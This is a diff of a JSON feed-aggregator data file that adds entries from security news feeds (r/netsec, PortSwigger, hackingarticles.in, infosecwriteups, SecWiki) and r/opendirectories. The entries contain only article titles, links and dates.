       "siteUrl": "https://www.reddit.com/r/netsec/",
       "articles": [
+        {
+          "id": "https://www.reddit.com/r/netsec/comments/t855za/backdooring_wordpress_using_pyshell/",
+          "author": null,
+          "description": "submitted by    /u/jonas02  \n [link]   [comments]",
+          "link": "https://www.reddit.com/r/netsec/comments/t855za/backdooring_wordpress_using_pyshell/",
+          "publishedOn": "2022-03-06T18:36:03.000Z",
+          "wordCount": null,
+          "title": "Backdooring WordPress using PyShell",
+          "imageUrl": null
+        },
+        {
+          "id": "https://www.reddit.com/r/netsec/comments/t7vm66/escaping_privileged_containers_for_fun/",
+          "author": null,
+          "description": "submitted by    /u/JordyZomer  \n [link]   [comments]",
+          "link": "https://www.reddit.com/r/netsec/comments/t7vm66/escaping_privileged_containers_for_fun/",
+          "publishedOn": "2022-03-06T09:55:13.000Z",
+          "wordCount": null,
+          "title": "Escaping privileged containers for fun.",
+          "imageUrl": null
+        },
+        {
+          "id": "https://www.reddit.com/r/netsec/comments/t7evgy/webos_revisited_even_more_mistaken_identities_the/",
+          "author": null,
+          "description": "submitted by    /u/addelindh  \n [link]   [comments]",
+          "link": "https://www.reddit.com/r/netsec/comments/t7evgy/webos_revisited_even_more_mistaken_identities_the/",
+          "publishedOn": "2022-03-05T17:53:42.000Z",
+          "wordCount": null,
+          "title": "webOS Revisited - Even More Mistaken Identities · The Recurity Lablog",
+          "imageUrl": null
+        },
         {
           "id": "https://www.reddit.com/r/netsec/comments/t6v5l0/the_perils_of_the_real_client_ip_or_the_many_ways/",
           "author": null,
@@ -33100,6 +33550,36 @@
       "feedUrl": "https://www.reddit.com/r/opendirectories/.rss",
       "siteUrl": "https://www.reddit.com/r/opendirectories/",
       "articles": [
+        {
+          "id": "https://www.reddit.com/r/opendirectories/comments/t7xp02/psa_reddit_appears_to_be_removing_postscomments/",
+          "author": null,
+          "description": "submitted by    /u/PM_ME_TO_PLAY_A_GAME  \n [link]   [comments]",
+          "link": "https://www.reddit.com/r/opendirectories/comments/t7xp02/psa_reddit_appears_to_be_removing_postscomments/",
+          "publishedOn": "2022-03-06T12:24:07.000Z",
+          "wordCount": null,
+          "title": "PSA: reddit appears to be removing posts/comments containing *.ru URLs",
+          "imageUrl": null
+        },
+        {
+          "id": "https://www.reddit.com/r/opendirectories/comments/t7it62/big_collection_of_720p_movies_solid_speeds_havent/",
+          "author": null,
+          "description": "submitted by    /u/SatansMoisture  \n [link]   [comments]",
+          "link": "https://www.reddit.com/r/opendirectories/comments/t7it62/big_collection_of_720p_movies_solid_speeds_havent/",
+          "publishedOn": "2022-03-05T21:03:32.000Z",
+          "wordCount": null,
+          "title": "Big Collection of 720p Movies, solid speeds, haven't explored all the directories, so I'm marking NSFW just in case.",
+          "imageUrl": null
+        },
+        {
+          "id": "https://www.reddit.com/r/opendirectories/comments/t7ikgo/classic_tv_various_video_qualities_decent_speeds/",
+          "author": null,
+          "description": "submitted by    /u/SatansMoisture  \n [link]   [comments]",
+          "link": "https://www.reddit.com/r/opendirectories/comments/t7ikgo/classic_tv_various_video_qualities_decent_speeds/",
+          "publishedOn": "2022-03-05T20:51:43.000Z",
+          "wordCount": null,
+          "title": "Classic TV: Various video qualities, decent speeds",
+          "imageUrl": null
+        },
         {
           "id": "https://www.reddit.com/r/opendirectories/comments/t61cgb/1st_post_atari_ftp_archive_atari8bitdemoscene/",
           "author": null,
@@ -36345,15 +36825,6 @@
           "publishedOn": "2021-03-11T16:08:00.000Z",
           "wordCount": 2342,
           "title": "<span>API Scanning with Burp Suite</span>"
-        },
-        {
-          "id": "web-application-cartography-mapping-out-burp-suites-crawler",
-          "author": null,
-          "description": "At the core of Burp Suite is Burp Scanner - a powerful tool designed to reduce the number of manual steps users have to take to discover vulnerabilities in their targets. Burp Scanner was first releas",
-          "link": "https://portswigger.net/blog/web-application-cartography-mapping-out-burp-suites-crawler",
-          "publishedOn": "2021-03-05T15:07:00.000Z",
-          "wordCount": 4756,
-          "title": "Web application cartography: mapping out Burp Suite’s crawler"
         }
       ]
     },
@@ -36362,6 +36833,16 @@
       "feedUrl": "https://www.hackingarticles.in/feed/",
       "siteUrl": "https://www.hackingarticles.in",
       "articles": [
+        {
+          "id": "https://www.hackingarticles.in/?p=27813",
+          "author": "Raj Chandel",
+          "description": "Introduction Many tools have been developed that create an HTTP request and allow a user to modify their contents. Fuzzing works the same way. A\nThe post A Detailed Guide on Wfuzz appeared first on Hacking Articles.",
+          "link": "https://www.hackingarticles.in/a-detailed-guide-on-wfuzz/",
+          "publishedOn": "2022-03-05T18:16:26.000Z",
+          "wordCount": null,
+          "title": "A Detailed Guide on Wfuzz",
+          "imageUrl": null
+        },
         {
           "id": "https://www.hackingarticles.in/?p=27806",
           "author": "Raj Chandel",
@@ -39730,6 +40211,26 @@
       "siteUrl": "https://infosecwriteups.com?source=rss----7b722bfd1b8d---4",
       "articles": [
         {
+          "id": "https://medium.com/p/8116e679455c",
+          "author": "Febi Mudiyanto",
+          "description": "",
+          "link": "https://infosecwriteups.com/day-9-networking-where-is-all-this-data-going-advent-of-cyber-3-2021-8116e679455c?source=rss----7b722bfd1b8d---4",
+          "publishedOn": "2022-03-04T09:06:55.000Z",
+          "wordCount": null,
+          "title": "[Day 9] Networking Where Is All This Data Going | Advent of Cyber 3 (2021)",
+          "imageUrl": null
+        },
+        {
+          "id": "https://medium.com/p/304fee8f211c",
+          "author": "Anurag__Verma",
+          "description": "",
+          "link": "https://infosecwriteups.com/html-injection-via-user-agent-leads-to-website-distortion-revealing-backend-code-304fee8f211c?source=rss----7b722bfd1b8d---4",
+          "publishedOn": "2022-03-04T09:06:52.000Z",
+          "wordCount": null,
+          "title": "HTML Injection via user agent leads to website distortion revealing backend code.",
+          "imageUrl": null
+        },
+        {
           "id": "https://medium.com/p/dea776b1b53d",
           "author": "Pencer",
           "description": "",
@@ -42788,6 +43289,26 @@
       "feedUrl": "https://www.sec-wiki.com/news/rss",
       "siteUrl": "http://www.sec-wiki.com/",
       "articles": [
+        {
+          "id": "http://www.sec-wiki.com/?2022-03-04",
+          "author": null,
+          "description": "Mnemosyne：一个高效的水坑攻击调查取证系统  by ourren\nGoDLP: 敏感信息保护系统  by ourren\nMake JDBC Attacks Brilliant Again 番外篇  by ourren\nAttack Flow — Beyond Atomic Behaviors   by ourren\n更多最新文章，请访问SecWiki",
+          "link": "http://www.sec-wiki.com/?2022-03-04",
+          "publishedOn": "2022-03-04T15:58:20.000Z",
+          "wordCount": null,
+          "title": "SecWiki News 2022-03-04 Review",
+          "imageUrl": null
+        },
+        {
+          "id": "http://www.sec-wiki.com/?2022-03-03",
+          "author": null,
+          "description": "从网络空间认知战到对俄大规模网络致瘫攻击  by ourren\n移动GS3101光猫分析 —— 狸猫换太子  by ourren\n跟着三梦学Java安全：半自动挖洞  by ourren\nTA402 针对中东目标持续发起攻击  by Avenger\n更多最新文章，请访问SecWiki",
+          "link": "http://www.sec-wiki.com/?2022-03-03",
+          "publishedOn": "2022-03-03T15:58:20.000Z",
+          "wordCount": null,
+          "title": "SecWiki News 2022-03-03 Review",
+          "imageUrl": null
+        },
         {
           "id": "http://www.sec-wiki.com/?2022-03-02",
           "author": null,
